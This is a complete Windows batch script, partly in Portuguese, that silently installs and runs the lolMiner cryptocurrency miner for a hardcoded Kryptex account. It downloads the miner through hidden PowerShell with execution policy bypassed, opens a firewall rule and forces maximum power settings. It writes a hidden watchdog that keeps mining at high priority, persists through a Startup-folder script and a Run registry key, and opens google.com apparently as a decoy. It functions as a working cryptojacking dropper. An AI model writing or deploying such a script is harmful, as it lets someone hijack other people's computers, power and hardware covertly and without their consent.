@echo off
setlocal EnableExtensions

set "KRYPTEX_MINING_USERNAME=krxXJ6MP7W"
set "WORKER_NAME=%COMPUTERNAME%"
set "ALGO=CR29"
set "POOL=xtm-c29.kryptex.network:7040"
set "APP_DIR=%LOCALAPPDATA%\KryptexDirect"
set "MINER_DIR=%APP_DIR%\lolminer"
set "DOWNLOAD_DIR=%APP_DIR%\download"
set "LOG_DIR=%APP_DIR%\logs"
set "WATCHDOG_PS1=%APP_DIR%\KryptexDirectWatchdog.ps1"
set "STARTUP_VBS=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KryptexDirectWatchdog.vbs"
set "RUN_NAME=KryptexDirectWatchdog"
set "LOL_API=https://api.github.com/repos/Lolliedieb/lolMiner-releases/releases/latest"
set "BROWSER_URL=http://google.com/"
set "BROWSER_FLAG=%LOG_DIR%\browser-opened.flag"
set "ULTIMATE_POWER_GUID=e9a42b02-d5df-448d-aa00-03f14749eb61"
set "HIGH_PERF_POWER_GUID=8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c"

if /I "%~1"=="--install" goto install

start "Kryptex Teste" /min "%~f0" --install
exit /b 0

:install
if "%KRYPTEX_MINING_USERNAME%"=="COLE_SEU_MINING_USERNAME_KRYPTEX_AQUI" exit /b 2

if not exist "%APP_DIR%" mkdir "%APP_DIR%" >nul 2>nul
if not exist "%DOWNLOAD_DIR%" mkdir "%DOWNLOAD_DIR%" >nul 2>nul
if not exist "%LOG_DIR%" mkdir "%LOG_DIR%" >nul 2>nul

taskkill /IM lolMiner.exe /F >nul 2>nul

call :apply_performance

call :ensure_lolminer
if errorlevel 1 exit /b 1

call :allow_firewall_out

call :write_watchdog
if errorlevel 1 exit /b 1

call :install_startup
if errorlevel 1 exit /b 1

powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
  "$watch='%WATCHDOG_PS1%';" ^
  "Start-Process -WindowStyle Hidden -FilePath powershell.exe -ArgumentList @('-WindowStyle','Hidden','-NoProfile','-ExecutionPolicy','Bypass','-File',$watch)"

call :open_browser_once
exit /b %errorlevel%

:ensure_lolminer
set "MINER_EXE="
for /f "delims=" %%F in ('dir /b /s "%MINER_DIR%\lolMiner.exe" 2^>nul') do (
  set "MINER_EXE=%%F"
  goto miner_found
)

if not exist "%MINER_DIR%" mkdir "%MINER_DIR%" >nul 2>nul

powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='Stop';" ^
  "$api='%LOL_API%';" ^
  "$downloadDir='%DOWNLOAD_DIR%';" ^
  "$minerDir='%MINER_DIR%';" ^
  "New-Item -ItemType Directory -Force -Path $downloadDir,$minerDir | Out-Null;" ^
  "$rel=Invoke-RestMethod -Headers @{ 'User-Agent'='KryptexDirectBat' } -Uri $api;" ^
  "$asset=$rel.assets | Where-Object { $_.name -match 'Win64.*\.zip$' -or $_.name -match 'Windows.*\.zip$' } | Select-Object -First 1;" ^
  "if(-not $asset){ $asset=$rel.assets | Where-Object { $_.name -match '\.zip$' -and $_.name -notmatch 'Lin|Linux|tar|gz' } | Select-Object -First 1 }" ^
  "if(-not $asset){ throw 'Nao encontrei ZIP Windows do lolMiner.' }" ^
  "$zip=Join-Path $downloadDir $asset.name;" ^
  "Invoke-WebRequest -Headers @{ 'User-Agent'='KryptexDirectBat' } -Uri $asset.browser_download_url -OutFile $zip;" ^
  "Remove-Item -Recurse -Force -Path (Join-Path $minerDir '*') -ErrorAction SilentlyContinue;" ^
  "Expand-Archive -Force -Path $zip -DestinationPath $minerDir;"

if errorlevel 1 exit /b 1

for /f "delims=" %%F in ('dir /b /s "%MINER_DIR%\lolMiner.exe" 2^>nul') do (
  set "MINER_EXE=%%F"
  goto miner_found
)

exit /b 1

:miner_found
exit /b 0

:allow_firewall_out
if not defined MINER_EXE exit /b 0
netsh advfirewall firewall delete rule name="KryptexDirect lolMiner Out" >nul 2>nul
netsh advfirewall firewall add rule name="KryptexDirect lolMiner Out" dir=out action=allow program="%MINER_EXE%" enable=yes profile=any >nul 2>nul
exit /b 0

:apply_performance
powercfg -duplicatescheme %ULTIMATE_POWER_GUID% >nul 2>nul
powercfg /setactive %ULTIMATE_POWER_GUID% >nul 2>nul
if errorlevel 1 powercfg /setactive %HIGH_PERF_POWER_GUID% >nul 2>nul

powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMIN 100 >nul 2>nul
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100 >nul 2>nul
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR SYSCOOLPOL 1 >nul 2>nul
powercfg /setacvalueindex SCHEME_CURRENT SUB_PCIEXPRESS ASPM 0 >nul 2>nul
powercfg /change standby-timeout-ac 0 >nul 2>nul
powercfg /change hibernate-timeout-ac 0 >nul 2>nul
powercfg /change monitor-timeout-ac 0 >nul 2>nul
powercfg /setactive SCHEME_CURRENT >nul 2>nul

for /f "delims=" %%N in ('where nvidia-smi.exe 2^>nul') do (
  "%%N" -pm 1 >nul 2>nul
  goto performance_done
)

:performance_done
exit /b 0

:open_browser_once
if exist "%BROWSER_FLAG%" exit /b 0
start "" "%BROWSER_URL%"
type nul > "%BROWSER_FLAG%"
exit /b 0

:write_watchdog
>"%WATCHDOG_PS1%" echo $ErrorActionPreference = 'SilentlyContinue'
>>"%WATCHDOG_PS1%" echo $minerDir = '%MINER_DIR%'
>>"%WATCHDOG_PS1%" echo $logDir = '%LOG_DIR%'
>>"%WATCHDOG_PS1%" echo $username = '%KRYPTEX_MINING_USERNAME%'
>>"%WATCHDOG_PS1%" echo $worker = '%WORKER_NAME%'
>>"%WATCHDOG_PS1%" echo $algo = '%ALGO%'
>>"%WATCHDOG_PS1%" echo $pool = '%POOL%'
>>"%WATCHDOG_PS1%" echo $browserUrl = '%BROWSER_URL%'
>>"%WATCHDOG_PS1%" echo $browserFlag = Join-Path $logDir 'browser-opened.flag'
>>"%WATCHDOG_PS1%" echo $initialDelaySeconds = 45
>>"%WATCHDOG_PS1%" echo $staleLogMinutes = 7
>>"%WATCHDOG_PS1%" echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
>>"%WATCHDOG_PS1%" echo $mutex = New-Object System.Threading.Mutex($false, 'Global\KryptexDirectWatchdog')
>>"%WATCHDOG_PS1%" echo if (-not $mutex.WaitOne(0, $false)) { exit }
>>"%WATCHDOG_PS1%" echo New-Item -ItemType Directory -Force -Path $minerDir, $logDir ^| Out-Null
>>"%WATCHDOG_PS1%" echo $shell = New-Object -ComObject WScript.Shell
>>"%WATCHDOG_PS1%" echo Start-Sleep -Seconds $initialDelaySeconds
>>"%WATCHDOG_PS1%" echo while ($true) {
>>"%WATCHDOG_PS1%" echo   $miner = Get-ChildItem -Path $minerDir -Recurse -Filter 'lolMiner.exe' ^| Select-Object -First 1
>>"%WATCHDOG_PS1%" echo   if ($miner) {
>>"%WATCHDOG_PS1%" echo     $running = Get-Process -Name 'lolMiner' -ErrorAction SilentlyContinue
>>"%WATCHDOG_PS1%" echo     $log = Join-Path $logDir ('lolminer-kryptex-' + $env:COMPUTERNAME + '.log')
>>"%WATCHDOG_PS1%" echo     if ($running) {
>>"%WATCHDOG_PS1%" echo       $running ^| ForEach-Object { try { $_.PriorityClass = 'High' } catch {} }
>>"%WATCHDOG_PS1%" echo       if ((Test-Path $log) -and ((Get-Date) - (Get-Item $log).LastWriteTime).TotalMinutes -gt $staleLogMinutes) {
>>"%WATCHDOG_PS1%" echo         $running ^| Stop-Process -Force -ErrorAction SilentlyContinue
>>"%WATCHDOG_PS1%" echo         Start-Sleep -Seconds 5
>>"%WATCHDOG_PS1%" echo         $running = $null
>>"%WATCHDOG_PS1%" echo       }
>>"%WATCHDOG_PS1%" echo     }
>>"%WATCHDOG_PS1%" echo     if ($null -eq $running) {
>>"%WATCHDOG_PS1%" echo       $arguments = '--algo ' + $algo + ' --pool ' + $pool + ' --user ' + $username + '/' + $worker + ' --watchdog exit'
>>"%WATCHDOG_PS1%" echo       $cmd = '"' + $miner.FullName + '" ' + $arguments
>>"%WATCHDOG_PS1%" echo       $shell.CurrentDirectory = $miner.DirectoryName
>>"%WATCHDOG_PS1%" echo       $shell.Run($cmd, 0, $false) ^| Out-Null
>>"%WATCHDOG_PS1%" echo       Start-Sleep -Seconds 5
>>"%WATCHDOG_PS1%" echo       Get-Process -Name 'lolMiner' -ErrorAction SilentlyContinue ^| ForEach-Object { try { $_.PriorityClass = 'High' } catch {} }
>>"%WATCHDOG_PS1%" echo       if (-not (Test-Path $browserFlag)) {
>>"%WATCHDOG_PS1%" echo         try { Start-Process $browserUrl; New-Item -ItemType File -Force -Path $browserFlag ^| Out-Null } catch {}
>>"%WATCHDOG_PS1%" echo       }
>>"%WATCHDOG_PS1%" echo     }
>>"%WATCHDOG_PS1%" echo   }
>>"%WATCHDOG_PS1%" echo   Start-Sleep -Seconds 60
>>"%WATCHDOG_PS1%" echo }
exit /b 0

:install_startup
>"%STARTUP_VBS%" echo Set WshShell = CreateObject("WScript.Shell")
>>"%STARTUP_VBS%" echo WshShell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File ""%WATCHDOG_PS1%""", 0, False

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%RUN_NAME%" /t REG_SZ /d "wscript.exe \"%STARTUP_VBS%\"" /f >nul 2>nul
exit /b %errorlevel%
